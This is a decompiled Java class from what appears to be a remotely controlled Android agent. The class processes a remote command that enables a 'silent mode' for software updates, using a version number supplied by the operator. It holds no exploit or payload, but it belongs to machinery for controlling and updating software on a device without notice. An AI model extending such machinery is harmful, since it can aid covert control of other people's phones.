package com.vvt.remotecommand.processor.misc;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.input.RmtCtrlInputUpdateAvailableSilentMode;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.util.ArrayList;
import java.util.Iterator;

public class s
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public s(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  private void a(ArrayList paramArrayList)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    int j = paramArrayList.size();
    Object localObject;
    if (j != i)
    {
      localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject).<init>();
      throw ((Throwable)localObject);
    }
    try
    {
      Iterator localIterator = paramArrayList.iterator();
      int k;
      do
      {
        boolean bool2 = localIterator.hasNext();
        if (!bool2) {
          return;
        }
        localObject = localIterator.next();
        localObject = (String)localObject;
        if (localObject == null) {
          break;
        }
        k = ((String)localObject).length();
      } while (k >= i);
      localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject).<init>();
      throw ((Throwable)localObject);
    }
    catch (NullPointerException localNullPointerException)
    {
      InvalidCommanFormatException localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      localInvalidCommanFormatException.<init>();
      throw localInvalidCommanFormatException;
    }
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRemoteCommand.getParameters();
    a((ArrayList)localObject1);
    Object localObject2 = null;
    localObject1 = (String)((ArrayList)localObject1).get(0);
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    localObject2 = h();
    RmtCtrlInputUpdateAvailableSilentMode localRmtCtrlInputUpdateAvailableSilentMode = new com/vvt/remotecontrol/input/RmtCtrlInputUpdateAvailableSilentMode;
    localRmtCtrlInputUpdateAvailableSilentMode.<init>();
    localRmtCtrlInputUpdateAvailableSilentMode.setVersionNumber((String)localObject1);
    localObject1 = new com/vvt/remotecontrol/ControlCommand;
    RemoteFunction localRemoteFunction = RemoteFunction.SET_UPDATE_AVAILABLE_SILENT_MODE;
    ((ControlCommand)localObject1).<init>(localRemoteFunction, localRmtCtrlInputUpdateAvailableSilentMode);
    int j = a;
    if (j != 0) {}
    localObject2 = ((com.vvt.remotecontrol.a)localObject2).execute((ControlCommand)localObject1);
    if (paramc != null)
    {
      bool1 = localObject2 instanceof RmtCtrlOutputStatusMessage;
      if (bool1)
      {
        localObject1 = localObject2;
        localObject1 = (RmtCtrlOutputStatusMessage)localObject2;
        j = ((RmtCtrlOutputStatusMessage)localObject1).isSuccess();
        localObject1 = ((RmtCtrlOutputStatusMessage)localObject1).getMessage();
        boolean bool3 = a;
        if (bool3) {}
        bool3 = a;
        if ((bool3) && (j == 0)) {
          break label200;
        }
        paramc.b(paramRemoteCommand, this, (String)localObject1);
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      label200:
      localObject2 = (RmtCtrlOutputStatusMessage)localObject2;
      localObject1 = ((RmtCtrlOutputStatusMessage)localObject2).getMessage();
      if (localObject1 != null)
      {
        int i = ((String)localObject1).length();
        j = 1;
        if (i > j)
        {
          localObject2 = new com/vvt/remotecommand/exception/RemoteCommandException;
          ((RemoteCommandException)localObject2).<init>((String)localObject1);
          paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject2);
          continue;
        }
      }
      localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
      localObject2 = "Unknown.";
      ((RemoteCommandException)localObject1).<init>((String)localObject2);
      paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "Set update available silent mode";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 0L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/misc/s.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */